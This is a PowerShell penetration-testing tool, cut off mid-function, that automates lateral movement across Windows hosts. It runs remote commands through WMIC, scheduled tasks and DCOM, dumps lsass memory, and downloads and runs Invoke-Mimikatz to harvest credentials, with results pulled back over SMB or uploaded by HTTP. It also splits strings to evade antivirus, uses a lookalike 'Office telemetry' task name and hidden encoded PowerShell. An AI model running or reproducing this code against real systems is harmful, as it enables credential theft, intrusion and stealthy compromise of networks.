function Invoke-LateralMovement{
<#
.SYNOPSIS
Automate built-in Windows commands that help during the Lateral Movement phase of a penetration test.
Author: Jesse Nebling (@bashexplode)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION
Wrapper to run a single command on multiple machines via wmic with a single set of user credentials, this script can also perform procdump,
perform Out-Minidump, or perform Invoke-Mimikatz -DumpCreds and pull the results to your machine from a single or multiple machines. This may be used to test a SOC or SIEM tool with multiple logins to machines.
YOU MUST HAVE procdump.exe ON YOUR LOCAL MACHINE TO USE THE -ProcDump SWITCH (https://download.sysinternals.com/files/Procdump.zip), if you have an internet connection -DownloadProcDump may be used.
TO USE THE -InvMkatz OR -MKatz SWITCHES YOU MUST HAVE THE Invoke-Mimikatz.ps1 SCRIPT HOSTED ON A WEB SERVER (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1).

-----------------------------
=============================
-----------------------------

.PARAMETER HostName
Specifies single host to run command on

.PARAMETER HostList
Specifies the file to read a list of hosts from, separated by newline.

.PARAMETER UserName
Specifies the username to use for the command

.PARAMETER Password
Specifies the password of the user

.PARAMETER Domain
Specifies Domain of the user account being used.

.PARAMETER OutputFolder
Specify output folder name and/or location on your local machine. (Default is current user's Desktop)

.SWITCH Delete
To be used with the -SchTasks switch, will delete the task created on a remote machine.

----------------------------

.SWITCH WmiCommand
Specifies that a [schtask, wmic, or Invoke-Wmimethod] command will be run on the corresponding hosts. Will ping an IP by default, unless given the -CustomCommand flag.

.PARAMETER IP
Specifies the IP the compromised machine will ping.

.PARAMETER CustomCommand
Specifies a custom command, if the user wants to take other actions than ping.

.SWITCH GoldenTicket
Specifies that if a golden ticket is in use to use the correct syntax.

\
.SWITCH SchTasks
Specifies that a task will be created on the remote machine instead of using wmic.

.PARAMETER TaskTime
Specifies the time the task will be run. [24-hour clock]

.PARAMETER TaskName
Specifies the name of the task that will be created. (By default it is set to "OfficeTe1emetryAgentLogOn")
/

\
.SWITCH Server
Commands results are recieved by webserver and output into a text file.

.PARAMETER ServerPort
Specifies what port the web server that collects output will be run on. (Port 80 by default)

.SWITCH FirewallRule
Add (and then remove) a firewall rule to allow access to port $ServerPort.
/

----------------------------

.SWITCH MMCCommand
Specifies that a MMC command will be run on the corresponding hosts. Will ping an IP by default, unless given the -CustomCommand flag. [ONLY WORKS IN A RUNAS CONTEXT]

.PARAMETER IP
Specifies the IP the compromised machine will ping.

.PARAMETER CustomCommand
Specifies a custom command, if the user wants to take other actions than ping.


-----------------------------

.SWITCH DCOMCommand
Specifies that a ShellWindows command will be run on the corresponding hosts. Will ping an IP by default, unless given the -CustomCommand flag. [ONLY WORKS IN A RUNAS CONTEXT]

.PARAMETER IP
Specifies the IP the compromised machine will ping.

.PARAMETER CustomCommand
Specifies a custom command, if the user wants to take other actions than ping.


-----------------------------

.SWITCH ProcDump
Specifies that ProcDump will be run on the specified hosts.

.SWITCH DownloadProcDump
Downloads procdump.exe from sysinternals and puts it into C:\Windows\Temp, if this switch is used -PDir doesn't need to be specified

.SWITCH GoldenTicket
Specifies that if a golden ticket is in use to use the correct syntax.

\
.SWITCH SchTasks
Specifies that a task will be created on the remote machine instead of using wmic.

.PARAMETER TaskTime
Specifies the time the task will be run. [24-hour clock]

.PARAMETER TaskName
Specifies the name of the task that will be created. (By default it is set to "OfficeTe1emetryAgentLogOn")
/

.PARAMETER PDir
Specifies the full filepath of Procdump.exe on the local machine.

.PARAMETER DumpDir
Specifies where files will get dumped on the target machines. Set to "C:\Windows\Temp" by default.

-----------------------------

.SWITCH MiniDump
Specifies that Out-Minidump will be run on the specified hosts.

.PARAMETER DumpDir
Specifies where files will get dumped on the target machines. Set to "C:\Windows\Temp" by default.

.PARAMETER Process
Specifies the process that will be dumped by name. (lsass by default)

-----------------------------

.SWITCH InvMkatz
Specifies that Invoke-M i m i ka t z will be run on the specified hosts with results pulled back over SMB.

.PARAMETER CustomCommand
Specifies a custom script command for Invoke- m i m i k a t z.(i.e. Invoke-Updates)

.PARAMETER ScriptDir
Specifies the full URL path of the Invoke-m i m i k a t z .ps1 script on a web server.

-----------------------------

.SWITCH MassKatz
Specifies that Invoke-M i m i k a t z will be run on the specified hosts with results pulled back over HTTP. [REQUIRES LOCAL ADMIN ON HOST MACHINE]

.PARAMETER CustomCommand
Specifies a custom script command for I n v o k e - m i m i k a t z.(i.e. Invoke-Updates)

.PARAMETER ScriptDir
Specifies the full URL path of the I n v o k e - m i m i k a t z .ps1 script on a web server.

.PARAMETER FirewallRule
Add (and then remove) a firewall rule to allow access to port $ServerPort.

.PARAMETER ServerPort
Specifies what port the web server that collects output will be run on. (Port 80 by default)

-----------------------------

.SWITCH ExecPS
Specifies that a PowerShell script will be run on the specified hosts with results pulled back over HTTP. [REQUIRES LOCAL ADMIN ON HOST MACHINE]

.PARAMETER CustomCommand
Specifies a custom script command to use.(i.e. Invoke-Updates, Invoke-StealthUserHunter -GroupName "Server Admins", etc)

.PARAMETER ScriptDir
Specifies the full URL path of the script on a web server.

.PARAMETER FirewallRule
Add (and then remove) a firewall rule to allow access to port $ServerPort.

.PARAMETER ServerPort
Specifies what port the web server that collects output will be run on. (Port 80 by default)

-----------------------------

.PARAMETER Delay
Delay between running commands, defaults to 0

.PARAMETER Jitter
Jitter for the command delay, defaults to +/- 0.3

-----------------------------
=============================
-----------------------------


.EXAMPLE
Perform ping back to 10.0.0.5 on a single host:
Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -IP 10.0.0.5

Perform ping back to 10.0.0.5 on multiple hosts:
Invoke-LateralMovement -HostList C:\temp\hosts.txt -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -IP 10.0.0.5

.EXAMPLE
Open up notepad.exe on a single host with the -CustomCommand flag
Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -CustomCommand "cmd.exe /c notepad.exe"

.EXAMPLE
Perform "vssadmin list shadows" on a single host with the -CustomCommand flag and receive the results with the -Server flag
Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -CustomCommand "cmd.exe /c vssadmin list shadows" -Server

-----------------------------

.EXAMPLE
Perform ping back to 10.0.0.5 on a single host:
Invoke-LateralMovement -HostName 10.0.0.2 -MMCCommand -IP 10.0.0.5

Perform ping back to 10.0.0.5 on multiple hosts:
Invoke-LateralMovement -HostList C:\temp\hosts.txt -MMCCommand -IP 10.0.0.5

.EXAMPLE
Open up notepad.exe on a single host with the -CustomCommand flag
Invoke-LateralMovement -HostName 10.0.0.2 -MMCCommand -CustomCommand "cmd.exe /c notepad.exe"

.EXAMPLE
Perform "vssadmin list shadows" on a single host with the -CustomCommand flag and receive the results with the -Server flag
Invoke-LateralMovement -HostName 10.0.0.2 -MMCCommand -CustomCommand "cmd.exe /c vssadmin list shadows" -Server

-----------------------------

.EXAMPLE
Perform ping back to 10.0.0.5 on a single host:
Invoke-LateralMovement -HostName 10.0.0.2 -DCOMCommand -IP 10.0.0.5

Perform ping back to 10.0.0.5 on multiple hosts:
Invoke-LateralMovement -HostList C:\temp\hosts.txt -DCOMCommand -IP 10.0.0.5

.EXAMPLE
Open up notepad.exe on a single host with the -CustomCommand flag
Invoke-LateralMovement -HostName 10.0.0.2 -DCOMCommand -CustomCommand "cmd.exe /c notepad.exe"

.EXAMPLE
Perform "vssadmin list shadows" on a single host with the -CustomCommand flag and receive the results with the -Server flag
Invoke-LateralMovement -HostName 10.0.0.2 -DCOMCommand -CustomCommand "cmd.exe /c vssadmin list shadows" -Server

-----------------------------

.EXAMPLE
Perform procdump on a single machine and pull the dump back to your local machine (Default will be on the Desktop):
Invoke-LateralMovement -HostName 10.0.0.2 -ProcDump -UserName AdminUser -Password P@55w0rd -Domain PWC -PDir C:\temp\procdump.exe

Perform procdump on multiple machines and pull the dump back to your local machine (Default will be on the Desktop):
Invoke-LateralMovement -HostList C:\temp\hosts.txt -ProcDump -UserName AdminUser -Password P@55w0rd -Domain PWC -PDir C:\temp\procdump.exe

-----------------------------

.EXAMPLE
Perform a minidump on the lsass process of a single machine and pull dump back to your local machine (Default will be on the Desktop):
Invoke-LateralMovement -HostName 10.0.0.2 -MiniDump -UserName AdminUser -Password P@55w0rd -Domain PWC

-----------------------------

.EXAMPLE
Perform I n v o k e - M i m i k a t z -DumpCreds on a single machine and pull results over SMB:
Invoke-LateralMovement -HostName 10.0.0.2 -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1

Perform I n v o k e - M i m i k a t z -DumpCreds on a multiple machine and pull results over SMB:
Invoke-LateralMovement -HostList C:\temp\hosts.txt -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1

Perform I n v o k e - M i m i k a t z -DumpCreds on a single machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):
Invoke-LateralMovement -HostName 10.0.0.2 -MassKatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -ServerPort 8080

Perform I n v o k e - M i m i k a t z -DumpCreds on a multiple machine  with a custom script name (Less Windows event logs) and pull results over HTTP on port 80 into the C:\temp folder:
Invoke-LateralMovement -HostList C:\temp\hosts.txt -MassKatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -OutputFolder "C:\temp"

.EXAMPLE
Perform Get-DomainGroupMember on a single machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):
Invoke-LateralMovement -HostName 10.0.0.2 -ExecPS -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'"

Perform Get-DomainGroupMember on a multiple machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):
Invoke-LateralMovement -HostList C:\temp\hosts.txt -ExecPS -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'"

#>

[CmdletBinding()]
Param(
        [String[]]
        $HostName,

        [string]
        $HostList,

        [Switch]
        $WmiCommand,

        [Switch]
        $MMCCommand,

        [Switch]
        $DCOMCommand,

        [Switch]
        $Server,

        [Switch]
        $ProcDump,

        [Switch]
        $InvMkatz,

        [Switch]
        $MassKatz,

        [Switch]
        $MiniDump,

        [Switch]
        $ExecPS,

        [Switch]
        $DownloadProcDump,

        [Switch]
        $SchTask,

        [Switch]
        $Delete,

        [Switch]
        $GoldenTicket,

        [string]
        $Domain,

        [string]
        $UserName,

        [string]
        $Password,

        [string]
        $IP,

        [string]
        $PDir,

        [string]
        $ScriptDir,

        [string]
        $ServerSleep,

        [string]
        $CustomCommand,

        [string]
        $TaskName="OfficeTe1emetryAgentLogOn",

        [string]
        $TaskTime,

        [string]
        $Process = "lsass",

        [string]
        $DumpDir = "C:\Windows\Temp\",

        [switch]
        $FirewallRule,

        [string]
        $ServerPort="80",

        [string]
        $OutputFolder,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3

)

# random object for delay
$RandNo = New-Object System.Random

if ($Domain)
{$UserStr = $Domain + "\" + $UserName}
else
{$UserStr = $UserName}



if($HostList){
    if (Test-Path -Path $HostList){
        $Hosts = Get-Content -Path $HostList
    }
    else{
    Write-Warning "[!] Input file '$HostList' doesn't exist!"
    "[!] Input file '$HostList' doesn't exist!"
    return
    }
}
elseif($HostName){
    $Hosts = $HostName
}
elseif(!$Hosts){
    Write-Warning "[!] Please use the -HostName or -HostList paramater to specify hosts!"
    "[!] Please use the -HostName or -HostList paramaters to specify hosts!"
    return
}


if($GoldenTicket){
    #Determine if the user used FQDN
    Do {
        Write-Host "Did you use the FQDN for the host(s)? [Warning: Using the Golden Ticket will not work without the FQDN!!!]"
        $GTanswer = Read-Host -prompt "(y/N)"
        if($GTanswer -eq ""){$GTanswer = 'n'}
        $GTanswer = $GTanswer.ToLower()
        if($GTanswer -eq "yes"){$GTanswer = "y"}
        if($GTanswer -eq "no"){$GTanswer = "n"}
    } until ($GTanswer -eq "y" -or $GTanswer -eq "n")
    if($GTanswer = "n"){Write-Warning "[!] Please rerun your command with the FQDN for all hosts!"
    "[!] Please rerun your command with the FQDN for all hosts!"
    break
    }
}
elseif(!$GoldenTicket -AND !$MMCCommand -AND !$DCOMCommand){
    if(!$UserName){
        Write-Warning "[!] Please use the -UserName flag to specify an username!"
        "[!] Please use the -UserName flag to specify an username!"
        break
    }

    if(!$Password){
        Write-Warning "[!] Please use the -Password flag to specify a password!"
        "[!] Please use the -Password flag to specify an password!"
        break
    }
}

if($DumpDir[-1] -ne "\"){
    $DumpDir += "\"
}

if($SchTask){
    if($Delete){
        if($GoldenTicket){
            $Hosts | % {
            schtasks /delete /s $_ /tn $TaskName
            }
        }
        elseif(!$GoldenTicket){
            $Hosts | % {
            schtasks /delete /s $_ /U $UserStr /P $Password /tn $TaskName
            }
        }
        Write-Host "[+] SchTask cleanup complete"
        break
    }
    if(!$TaskTime){
        Write-Warning "[!] Please use the -TaskTime flag to specify the time for the command to run! (24-hour clock)"
        "[!] Please use the -TaskTime flag to specify the time for the command to run! (24-hour clock)"
        break
    }
}

while ($true)
{



        if($WmiCommand){
            if(!$CustomCommand){
                if(!$HostName){
                Write-Warning "[!] Please use the -IP flag to specify an IP to ping on all machines!"
                "[!] Please use the -IP flag to specify an IP to ping on all machines!"
                break
                }
                $CustomCommand = "cmd.exe /c ping $IP"
            }
            if($Server){
                #Check to see if Output folder was set, if not create new folder
                if(!$OutputFolder){
                    $OutputFolder = "Command_Output"
                }

                # if the output folder isn't a full path, append to user's desktop
                if(-not ($OutputFolder.Contains("\"))){
                        $OutputFolder = "$env:USERPROFILE\Desktop\$OutputFolder"
                }

                # create the output folder if it doesn't exist
                if(-not (Test-Path $OutputFolder)){
                New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null}

                # script block to invoke over remote machines.
                $LocalPort = $ServerPort
                if($FirewallRule){
                Start-Server -ServerPort $LocalPort -OutputFolder $OutputFolder -FirewallRule}
                elseif(!$FirewallRule){
                Start-Server -ServerPort $LocalPort -OutputFolder $OutputFolder }

                if(-not $LocalIpAddress){
                    $p = (gwmi Win32_NetworkAdapterConfiguration| Where{$_.IPAddress} | Select -Expand IPAddress);
                    # check if the IP is a string or the [IPv4,IPv6] array
                    $LocalIpAddress = $p[0]
                }
                $netfriendly = $CustomCommand.Replace(" ","-")
                $netfriendly = $netfriendly.Replace("/","_")

                $Hosts | % {
                    # the download/check back in command
                    $ExecCommand = "$CustomCommand | % {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$_))} | % {(new-object net.webclient).UploadString(`"http://$LocalIpAddress`:$LocalPort/$_-$netfriendly`", `$_)}"
                    $bytes = [Text.Encoding]::Unicode.GetBytes($ExecCommand)
                    $ExecEncoded = [Convert]::ToBase64String($bytes)

                    #Compile full execution string
                    $ExecPSString = "powershell.exe -nOP -noNi -W Hidden -E $ExecEncoded"

                    # see if different credentials are specified to run on the remote host
                    if($Password){
                        $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
                        $creds = New-Object System.Management.Automation.PSCredential ($UserStr, $secpass)
                        Write-Host "[*] Executing `"$CustomCommand`" on host $_ with credentials for $UserStr"
                        Invoke-WmiMethod -Credential $creds -ComputerName $_ -Path Win32_process -Name create -ArgumentList "$ExecPSString" | out-null
                        Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }
                    else{
                        Write-Host "Executing `"$CustomCommand`" on host $_ as $env:USERDOMAIN\$env:USERNAME"
                        Invoke-WmiMethod -ComputerName $_ -Path Win32_process -Name create -ArgumentList "$ExecPSString" | out-null
                        Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }


                }
                if(!$ServerSleep){
                $ServerSleep=10
                }
                Write-Host "[*] Waiting $ServerSleep seconds for commands to trigger..."
                Start-Sleep -s $ServerSleep

		        #Parse all output
                Write-Host "[*] Parsing output from folder `"$OutputFolder`""
                $CurrentLoc = $PWD
                Set-Location $OutputFolder
                Get-ChildItem $OutputFolder -Filter *.txt |
                % {$a = $_.Name -split ".tx",0;Write-Host $a[0] "results:" ;Write-Host "-------------";Get-Content $_;Write-Host "-------------"}
                Set-Location $CurrentLoc

                if($FirewallRule){
                Stop-Server -FirewallRule}
                elseif(!$FirewallRule)
                {Stop-Server}

                break
            }
            else{
                $Hosts| % {
                if($SchTask){
                    if($GoldenTicket){
                        $wmicstring = "schtasks /create /S $_ /RL HIGHEST /sc once /st $TaskTime /tn '$TaskName' /tr '$CustomCommand'"
                    }
                    elseif(!$GoldenTicket){
                        $wmicstring = "schtasks /create /S $_ /U $UserStr /P '$Password' /RL HIGHEST /sc once /st $TaskTime /tn '$TaskName' /tr '$CustomCommand'"
                    }
                }
                elseif(!$SchTask){
                    if($GoldenTicket){
                        $wmicstring = "wmic /node:$_ /authority:'kerberos:$Domain\$_' process call create `"$CustomCommand`""
                    }
                    elseif(!$GoldenTicket){
                        $wmicstring = "wmic /node:$_ /user:$UserStr /password:'$Password' process call create `"$CustomCommand`""
                    }
                }
                IEX $wmicstring | Out-Null
                Write-Host "[+] `"$CustomCommand`" was run on $_."
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                }
            break
            }
        }
        elseif($MMCCommand){
            if(!$CustomCommand){
                if(!$HostName){
                Write-Warning "[!] Please use the -IP flag to specify an IP to ping on all machines!"
                "[!] Please use the -IP flag to specify an IP to ping on all machines!"
                break
                }
                $Prog = "cmd.exe"
                $CArgs = "/c ping $IP"
            }
            else{
                $SplitCommand = $CustomCommand.Split()
                $Prog = $SplitCommand[0]
                $CArgs = $SplitCommand[1 .. ($SplitCommand.Length - 1)] -Join ' '
            }

            $Hosts| % {
            $exec = "[activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$_`")).Document.ActiveView.ExecuteShellCommand(`"$Prog`",`$null,`"$CArgs`",`"7`")"
            IEX $exec

            Write-Host "[+] `"$Prog $CArgs`" was run on $_."
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            break
            }
        }
        elseif($DCOMCommand){
            if(!$CustomCommand){
                if(!$HostName){
                Write-Warning "[!] Please use the -IP flag to specify an IP to ping on all machines!"
                "[!] Please use the -IP flag to specify an IP to ping on all machines!"
                break
                }
                $Prog = "cmd.exe"
                $CArgs = "/c ping $IP"
            }
            else{
                $SplitCommand = $CustomCommand.Split()
                $Prog = $SplitCommand[0]
                $CArgs = $SplitCommand[1 .. ($SplitCommand.Length - 1)] -Join ' '
            }

            $Hosts| % {
            $exec = "[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',`"$_`")).Item().Document.Application.ShellExecute(`"$Prog`",`"$CArgs`",`$null,`$null,0)"
            IEX $exec

            Write-Host "[+] `"$Prog $CArgs`" was run on $_."
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            break
            }
        }
        elseif($ProcDump){
            #Check for the $DownloadProcDump switch, if not check if the PDir flag was set
            if($DownloadProcDump){
                $path = $env:TEMP
                $afile = "$path\procdump.zip"
                $DPD = "(New-Object net.webclient).downloadfile('https://download.sysinternals.com/files/Procdump.zip', `'$afile`')"
                IEX $DPD
                $shell = new-object -com shell.application
                $zip = $shell.NameSpace($afile)
                $item = $zip.items().item("procdump.exe")
                $shell.Namespace($path).copyhere($item)
                Remove-Item $afile -Force
                $PDir = "$path\procdump.exe"
            }
            elseif(!$PDir){
                Write-Warning "[!] Please use the -PDir flag to specify the full filepath where procdump.exe is stored locally!"
                "[!] Please use the -PDir flag to specify the full filepath where procdump.exe is stored locally!"
                break
            }

            #Build Procdump Execution String
            [string]$ProcDumpExecution = "$DumpDir`procdump.exe -accepteula -ma lsass.exe $DumpDir`debug.dmp"

            #Replace the $DumpDir variable first character with P so it will mount properly in the execution, PowerShell is dumb and won't let me do it efficiently so created a new variable
            $TempDir = $DumpDir.ToCharArray()
            $TempDir[0] = "P"
            $DumpDir = $TempDir -join ''

                #Check to see if Output folder was set, if not create new folder
            if(!$OutputFolder){
                $OutputFolder = "Procdump_Output"
            }

            # if the output folder isn't a full path, append to user's desktop
            if(-not ($OutputFolder.Contains("\"))){
                    $OutputFolder = "$env:USERPROFILE\Desktop\$OutputFolder"
            }

            # create the output folder if it doesn't exist
            if(-not (Test-Path $OutputFolder)){
            New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null}

            #Execute on all $Hosts
            $Hosts | % {
            if($SchTask){
                if($GoldenTicket){
                    $1 = "net use P: \\$_\C$"
                    $3 = "schtasks /create /S $_ /RL HIGHEST /sc once /st $TaskTime /tn `"$TaskName`" /tr `"$ProcDumpExecution`""
                    $8 = "schtasks /delete /S $_ /tn '$TaskName'"
                }
                elseif(!$GoldenTicket){
                    $1 = "net use P: \\$_\C$ /user:$UserStr $Password"
                    $3 = "schtasks /create /S $_ /U $UserStr /P `"$Password`" /RL HIGHEST /sc once /st $TaskTime /tn `"$TaskName`" /tr `"$ProcDumpExecution`""
                    $8 = "schtasks /delete /S $_ /U $UserStr /P `"$Password`" /tn `"$TaskName`""
                }
            }
            elseif(!$SchTask){
                if($GoldenTicket){
                    $1 = "net use P: \\$_\C$"
                    $3 = "wmic /node:$_ /authority:`"kerberos:$Domain\$_`" process call create `"cmd.exe /c $ProcDumpExecution`""

                }
                elseif(!$GoldenTicket){
                    $1 = "net use P: \\$_\C$ /user:$UserStr $Password"
                    $3 = "wmic /node:$_ /user:$UserStr /password:$Password process call create `"cmd.exe /c $ProcDumpExecution`""
                }
            }

            $2 = "copy $PDir $DumpDir`procdump.exe -force"
            $4 = "Copy-Item '$dumpdir`debug.dmp' '$OutputFolder\$_.dmp' -Force"
            $5 = "del '$DumpDir`procdump.exe'"
            $6 = "del '$DumpDir`debug.dmp'"
            $7 = "net use P: /delete"

            IEX $1 | Out-Null
            Write-Host "[+] Mounted \\$_\C$ Share"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $2 | Out-Null
            Write-Host "[+] Copied procdump.exe to \\$_\$DumpDir"
            Write-Host "[*] Running command to perform procdump on $_"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $3 | Out-Null
            Write-Host "[+] Command completed"
            Write-Host "[*] Waiting for procdump to complete memory dump..."
            Do{
            sleep 0.5
            } until (Test-Path "$DumpDir`debug.dmp")
            Write-Host "[+] Memory successfully dumped at $DumpDir`debug.dmp"
            Write-Host "[*] Copying memory dump to $OutputFolder"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $4 | Out-Null
            Write-Host "[+] Memory dump copied to $OutputFolder\$_.dmp"
            Write-Host "[*] Performing cleanup on $a..."
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $5 | Out-Null
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $6 | Out-Null
            Write-Host "[+] Cleanup complete"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $7 | Out-Null
            Write-Host "[+] Unmounted \\$_\C$ Share"
            if ($SchTask){
                 IEX $8 | Out-Null
                Write-Host "[+] SchTask Cleaned Up"
            }
            Write-Host "[+] Procdump complete for $_"
            }
            break
        }
        elseif($InvMkatz){
            #bypass virus scan for m i m i k a t z strings
            $all = "Invoke-"
            $all += "Mim"
            $all += "ika"
            $all += "tz"
            $all = $all -join ''

            if(!$CustomCommand){
                $CustomCommand = $all
            }

            if(!$ScriptDir){
            Write-Warning "[!] Please use the -ScriptDir flag to specify the full URL file path where $all.ps1 is stored on a web server!"
            "[!] Please use the -ScriptDir flag to specify the full URL file path where $all.ps1 is stored on a web server!"
            return
            }
            #Build Execution String
            [string]$InvMimzCode = "iex (new-object net.webclient).downloadstring('$ScriptDir'); $CustomCommand > $DumpDir`dump.txt;"

            #Base64 Encode the string
            $ExecBytes = [System.Text.Encoding]::Unicode.GetBytes($InvMimzCode)
            $ExecEncoded = [Convert]::ToBase64String($ExecBytes)

            #Compile full execution string
            $ExecPSString = "powershell.exe -nOP -noNi -W Hidden -E $ExecEncoded"


            #Replace the $DumpDir variable first character with P so it will mount properly in the execution, PowerShell is dumb and won't let me do it efficiently so created a new variable
            $TempDir = $DumpDir.ToCharArray()
            $TempDir[0] = "P"
            $DumpDir = $TempDir -join ''

                #Check to see if Output folder was set, if not create new folder
            if(!$OutputFolder){
                $OutputFolder = "Mkatz_Output"
            }

            # if the output folder isn't a full path, append to user's desktop
            if(-not ($OutputFolder.Contains("\"))){
                    $OutputFolder = "$env:USERPROFILE\Desktop\$OutputFolder"
            }

            # create the output folder if it doesn't exist
            if(-not (Test-Path $OutputFolder)){
            New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null}

            #Execute on all $Hosts
            $Hosts | % {
            if($GoldenTicket){
                $1 = "net use P: \\$_\C$"
                $2 = "wmic /node:$_ /authority:'kerberos:$Domain\$_' process call create `"cmd.exe /c $ExecPSString`""

            }
            elseif(!$GoldenTicket){
                $1 = "net use P: \\$_\C$ /user:$UserStr $Password"
                $2 = "wmic /node:$_ /user:$UserStr /password:$Password process call create `"cmd.exe /c $ExecPSString`""
            }

            $3 = "copy '$DumpDir`dump.txt' '$OutputFolder\$_-dump.txt'"
            $4 = "del '$DumpDir`dump.txt'"
            $5 = "net use P: /delete"

            IEX $1 | Out-Null
            Write-Host "[+] Mounted \\$_\C$ Share"
            Write-Host "[*] Running wmic to perform $all on $_"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $2 | Out-Null
            Write-Host "[*] Waiting for $all to complete credential dump..."
            sleep 20
            Write-Host "[+] Credentials successfully dumped at $DumpDir`dump.txt"
            Write-Host "[*] Copying credential dump to $OutputFolder"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $3 | Out-Null
            Write-Host "[+] Credential dump copied to $OutputFolder\$_-dump.txt"
            Write-Host "[*] Performing cleanup on $_..."
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $4 | Out-Null
            Write-Host "[+] Cleanup complete"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $5 | Out-Null
            Write-Host "{+] Unmounted \\$_\C$ Share"
            Write-Host "[+] $all complete for $_"
            }

                # parse all of the output
                Write-Host "[*] Parsing output from folder `"$OutputFolder`""
		        $CurrentLoc = $PWD
		        Set-Location $OutputFolder
                [string[]]$parseout = ""
                Get-ChildItem $OutputFolder -Filter *.txt |
                foreach-object {
                    [string[]]$serverstring = $_.Name[0 .. ($_.Name.Length - 10)] -join ''
                    $raw = [Io.File]::ReadAllText($_.FullName)
                    $creds = Parse-Mkatz $raw

                    foreach($cred in $creds){
                        if ( ($cred) -and ($cred.Trim() -ne "")){
                            $parseout += "$serverstring`t`t$cred"

                        }
                    }
                }
                Write-Host "`nHost`t`t`tCredentials"
                Write-Host "----`t`t`t-----------"
                $parseout
                Write-Host "`n"
                Set-Location $CurrentLoc
            break
        }
        elseif($MiniDump){
            #Build Minidump Execution String
            [string[]]$MinidumpCode = "`$DumpFilePath = '$DumpDir';"
            $MinidumpCode += "`$aProcess = Get-Process $Process;"
            $MinidumpCode += "`$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');`$WERNativeMethods = `$WER.GetNestedType('NativeMethods', 'NonPublic');`$Flags = [Reflection.BindingFlags] 'NonPublic, Static';`$MiniDumpWriteDump = `$WERNativeMethods.GetMethod('MiniDumpWriteDump', `$Flags);`$MiniDumpWithFullMemory = [UInt32] 2;`$ProcessId = `$aProcess.Id;`$ProcessName = `$aProcess.Name;`$ProcessHandle = `$aProcess.Handle;`$ProcessFileName = `"crash.dmp`";`$ProcessDumpPath = Join-Path `$DumpFilePath `$ProcessFileName;`$FileStream = New-Object IO.FileStream(`$ProcessDumpPath, [IO.FileMode]::Create);`$Result = `$MiniDumpWriteDump.Invoke(`$null, @(`$ProcessHandle,`$ProcessId,`$FileStream.SafeFileHandle,`$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));`$FileStream.Close()"

            #Base64 Encode the string
            $ExecBytes = [System.Text.Encoding]::Unicode.GetBytes([string]::Join('',$MinidumpCode))
            $ExecEncoded = [Convert]::ToBase64String($ExecBytes)

            #Compile full execution string
            $ExecPSString = "powershell.exe -nOP -noNi -W Hidden -E $ExecEncoded"

            #Replace the $DumpDir variable first character with P so it will mount properly in the execution, PowerShell is dumb and won't let me do it efficiently so created a new variable
            $TempDir = $DumpDir.ToCharArray()
            $TempDir[0] = "P"
            $DumpDir = $TempDir -join ''

            #Check to see if Output folder was set, if not create new folder
            if(!$OutputFolder){
                $OutputFolder = "Minidump_Output"
            }

            # if the output folder isn't a full path, append to user's desktop
